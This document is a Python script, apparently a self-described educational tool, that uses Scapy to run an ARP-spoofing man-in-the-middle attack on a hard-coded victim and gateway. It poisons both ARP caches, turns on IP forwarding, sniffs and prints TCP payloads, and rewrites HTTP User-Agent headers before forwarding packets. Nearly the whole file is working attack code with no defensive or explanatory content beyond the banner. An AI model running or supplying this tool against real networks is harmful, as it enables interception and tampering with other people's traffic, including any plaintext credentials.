#!/usr/bin/env python3
from scapy.all import *
import os
import sys
import threading
import time
import signal

# Configuration
TARGET_IP      = "192.168.1.100"  # Victim IP
GATEWAY_IP     = "192.168.1.1"     # Router IP
INTERFACE      = "eth0"            # Network interface
PACKET_FILTER  = "tcp"            # Filter for TCP packets (modify as needed)

# Enable IP forwarding (so traffic still flows)
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Restore ARP tables on exit
def restore_arp(target_ip, gateway_ip, interface):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), iface=interface, count=5)
    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), iface=interface, count=5)
    print("[!] ARP tables restored.")

# ARP spoofing (redirect traffic to us)
def arp_spoof(target_ip, gateway_ip, interface):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    print(f"[*] ARP spoofing: {target_ip} -> {gateway_ip}")
    try:
        while True:
            # Tell the target we're the router
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=interface)
            # Tell the router we're the target
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=interface)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(target_ip, gateway_ip, interface)
        sys.exit(0)

# Packet sniffer (intercept/modify traffic)
def packet_callback(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto = packet[IP].proto

        # Print basic info
        print(f"\n[+] Packet: {src_ip} -> {dst_ip} (Proto: {proto})")

        # Check for TCP (e.g., HTTP)
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            print(f"[*] TCP Payload:\n{payload[:500]}")  # Print first 500 chars

            # Example: Modify HTTP "User-Agent"
            if "User-Agent:" in payload:
                modified_payload = payload.replace("User-Agent:", "User-Agent: HACKED-BY-MITM")
                packet[Raw].load = modified_payload.encode()
                print("[!] Modified User-Agent!")

        # Forward the packet (modified or not)
        send(packet, verbose=0)

# Clean exit handler
def signal_handler(sig, frame):
    print("\n[!] Stopping MITM...")
    restore_arp(TARGET_IP, GATEWAY_IP, INTERFACE)
    sys.exit(0)

# Main MITM function
def start_mitm():
    signal.signal(signal.SIGINT, signal_handler)
    enable_ip_forwarding()

    # Start ARP spoofing in background
    arp_thread = threading.Thread(target=arp_spoof, args=(TARGET_IP, GATEWAY_IP, INTERFACE))
    arp_thread.daemon = True
    arp_thread.start()

    # Start packet sniffing
    print(f"[*] Sniffing traffic on {INTERFACE}...")
    sniff(iface=INTERFACE, filter=PACKET_FILTER, prn=packet_callback, store=0)

if __name__ == "__main__":
    print("[=== CUSTOM MITM TOOL (Educational Use Only) ===]")
    start_mitm()